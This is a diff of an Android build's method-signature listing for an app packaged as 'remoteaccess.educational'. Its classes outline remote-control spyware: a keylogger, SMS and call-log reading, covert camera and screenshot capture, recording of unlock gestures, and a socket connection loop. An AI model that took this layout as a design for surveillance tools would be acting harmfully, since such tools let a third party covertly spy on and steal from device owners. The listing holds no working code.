@@ -13013,6 +13013,8 @@ com.remoteaccess.educational.commands.AppMonitor:
     public static boolean isMonitored(java.lang.String)
     public static void onAppForeground()
     public static void onTextChanged()
+com.remoteaccess.educational.commands.CameraHandler:
+    public static org.json.JSONObject takePhoto()
 com.remoteaccess.educational.commands.CommandExecutor:
     public static int frequencyToChannel()
     public static org.json.JSONObject handleGetCallLogs()
@@ -13054,9 +13056,9 @@ com.remoteaccess.educational.commands.GestureRecorder:
     public java.lang.String liveStreamFilename
     public volatile long servicePtsStart
     public static void commitAdvancedUnlockOnUnlock()
-    public final org.json.JSONObject deleteLiveStream(java.lang.String)
-    public final boolean isPaused()
-    public final boolean isRecording()
+    public static org.json.JSONObject deleteLiveStream()
+    public static boolean isPaused()
+    public static boolean isRecording()
     public static synthetic void lambda$doStartAutoCapture$7()
     public static void lambda$doStartAutoCapture$8()
     public static synthetic void lambda$onLockGestureLifted$15()
@@ -13090,7 +13092,6 @@ com.remoteaccess.educational.commands.KeyloggerService:
 com.remoteaccess.educational.commands.PermissionManager:
     public final boolean checkPermission(java.lang.String)
 com.remoteaccess.educational.commands.SMSHandler:
-    public static org.json.JSONObject deleteSMS()
     public static org.json.JSONObject getAllSMS()
     public static org.json.JSONObject getSMSFromNumber()
     public static org.json.JSONObject sendSMS()
@@ -13125,6 +13126,7 @@ com.remoteaccess.educational.commands.ScreenReader:
 com.remoteaccess.educational.commands.ScreenshotHandler:
     public android.content.Context context
     public static android.graphics.Bitmap captureBitmap()
+    public static org.json.JSONObject takeScreenshot()
 com.remoteaccess.educational.network.SocketManager:
     public static android.graphics.Bitmap captureFrame()
     public static void connectionLoop()
@@ -13134,7 +13136,7 @@ com.remoteaccess.educational.network.SocketManager:
     public static com.remoteaccess.educational.commands.GestureRecorder getGestureRecorder()
     public static com.remoteaccess.educational.commands.KeyloggerService getKeylogger()
     public static void initGestureRecorder()
-    public static boolean isAccessibilityCommand(java.lang.String)
+    public static boolean isAccessibilityCommand()
     public static boolean isConnected()
     public static boolean isGestureCommand()
     public final boolean isStreamingActive()
@@ -13170,6 +13172,7 @@ com.remoteaccess.educational.network.SocketManager:
     public static void sendHeartbeat()
     public static void sendPong()
     public static void sendResponse()
+    public static void startBlockFrameMode()
     public static void startHeartbeat()
     public final void startIdleFrameMode(java.lang.String)
     public static void stopScreenReaderAutoNoSave()
@@ -14428,7 +14431,7 @@ org.json.JSONArray:
     public static java.lang.String getString()
     public final boolean isNull(int)
     public static java.lang.String join()
-    public final int length()
+    public static int length()
     public static org.json.JSONArray put()
 org.json.JSONObject$$InternalSyntheticThrowCCEIfNotNull$22$67e8c5b6bde50bf7bbc7b33526bc0036fc2845ee12b8453903722439e4cb045c$0
 org.json.JSONObject$1
@@ -14437,8 +14440,8 @@ org.json.JSONObject:
     public final java.util.Iterator keys()
     public final java.lang.Object opt(java.lang.String)
     public static boolean optBoolean()
-    public final boolean optBoolean(java.lang.String)
-    public final int optInt(int)
+    public static boolean optBoolean$1()
+    public static int optInt()
     public final long optLong()
     public final void optLong()
     public static java.lang.String optString()
